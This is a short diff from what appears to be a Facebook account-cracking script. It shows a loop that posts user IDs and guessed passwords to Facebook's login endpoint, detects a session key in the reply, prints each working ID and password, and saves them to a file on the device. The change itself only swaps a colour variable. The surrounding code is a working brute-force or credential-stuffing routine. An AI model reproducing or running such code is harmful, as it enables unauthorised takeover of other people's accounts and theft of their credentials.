@@ -288,7 +288,7 @@ def file_subb(uid,pwx):
             p = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False).text
             q=json.loads(p)
             if "session_key" in q:
-                print(f"\r\r{li}  [GXDS-OK] {uid} | {ps}      ")
+                print(f"\r\r{grn}  [GXDS-OK] {uid} | {ps}      ")
                 open("/sdcard/gxds-ok.txt","a").write(uid+"|"+ps+"\n")
                 oks.append(uid)
                 break
